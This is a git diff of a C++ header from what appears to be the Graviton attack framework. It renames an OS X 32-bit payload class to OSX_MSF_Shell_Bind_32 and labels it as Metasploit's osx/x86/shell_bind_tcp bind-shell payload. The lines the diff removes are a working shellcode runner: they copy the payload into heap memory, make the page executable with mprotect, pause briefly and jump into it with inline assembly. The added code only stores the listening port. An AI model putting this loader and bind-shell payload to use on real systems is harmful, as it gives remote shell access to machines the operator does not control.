@@ -19,22 +19,26 @@
  * You should have received a copy of the GNU General Public License
  * along with Graviton.  If not, see http://www.gnu.org/licenses/.
  *
- * @brief Payload_Osx32b
+ * @brief OSX_MSF_Shell_Bind_32
  *
 */
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-#ifndef _GVN_PAYLOAD_OSX32b_H_
-#define _GVN_PAYLOAD_OSX32B_H_
+#ifndef _GVN_OSX_MSF_Shell_Bind_32_H_
+#define _GVN_OSX_MSF_Shell_Bind_32_H_
 
-#include "../gvn_payload.hpp"
+#include <payload/payload.hpp>
 
 #include <cstdio>
 #include <cstdlib>
 #include <sys/mman.h>
 #include <errno.h>
 
-using namespace GraVitoN;
+namespace GraVitoN
+{
+
+namespace Payload
+{
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
 /**
@@ -42,37 +46,35 @@ using namespace GraVitoN;
  *
  * @see Payload_Sample
  */
-class Payload_Osx32b : public GraVitoN::Bin_Payload
+class OSX_MSF_Shell_Bind_32 : public GraVitoN::Payload::Binary_Payload
 {
+private:
+    unsigned int port;
+
 protected:
 	virtual bool initPayload();
-	
-public:
-    Payload_Osx32b();
-    virtual ~Payload_Osx32b();
 
-    virtual bool initialize ( const string &_options );
-    virtual bool run();
+public:
+    OSX_MSF_Shell_Bind_32();
+    virtual ~OSX_MSF_Shell_Bind_32();
+
+    virtual bool initialize ( const unsigned int &bport );
 };
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-Payload_Osx32b::Payload_Osx32b()
+OSX_MSF_Shell_Bind_32::OSX_MSF_Shell_Bind_32()
 {
     jumper = _null_;
 }
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-Payload_Osx32b::~Payload_Osx32b()
+OSX_MSF_Shell_Bind_32::~OSX_MSF_Shell_Bind_32()
 {
 }
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-bool Payload_Osx32b::initPayload()
-{
-	int port = 7357;
-	/// Parse options
-	OptParser::getValueAsInt(options, "PORT", port);
-	
+bool OSX_MSF_Shell_Bind_32::initPayload()
+{	
     /**
     * osx/x86/shell_bind_tcp - 74 bytes \n
     * http://www.metasploit.com \n
@@ -102,50 +104,17 @@ bool Payload_Osx32b::initPayload()
 }
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-bool Payload_Osx32b::initialize ( const string &_options )
+bool OSX_MSF_Shell_Bind_32::initialize(const unsigned int &bport)
 {
-    options = _options;
+    port = bport;
 
-    Logger::logIt ( "init payload... " );
+    Core::Logger::logIt ( "init payload... " );
     initPayload();
-    Logger::logItLn ( "done" );
-
-    jumper = ( void ( * ) ( void* ) ) malloc ( payload_size );
-    memcpy ( ( void* ) jumper, ( void * ) payload, payload_size * sizeof ( unsigned char ) );
+    Core::Logger::logItLn ( "done" );
 
     return true;
 }
 
-//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-bool Payload_Osx32b::run()
-{
-    /// Set Page Permissions
-    unsigned long page = ( unsigned long ) jumper & ~ ( unsigned long ) ( getpagesize() - 1 );
-    if ( mprotect ( ( unsigned char* ) page, getpagesize(), PROT_READ | PROT_WRITE | PROT_EXEC ) ) {
-        Logger::logIt ( "mprotect failed - errorno: " );
-        Logger::logItLn ( errno );
-
-        return false;
-    }
-
-    // A Little Delay!
-    int _delay = 320;
-    while ( _delay > 0 ) {
-        --_delay;
-    }
-
-    int useless_out = 0;
-    Logger::logItLn ( "Jumping..." );
-    asm (
-        "mov %1, %%ecx;"
-        "jmp *%%ecx;"
-        : "=r" ( useless_out )
-        : "r" ( jumper )
-        : "%ecx"
-    );
-    Logger::logItLn ( "call > done" );
-
-    return true;
 }
-
-#endif // _GVN_PAYLOAD_OSX32B_H_
+}
+#endif // _GVN_OSX_MSF_Shell_Bind_32_H_
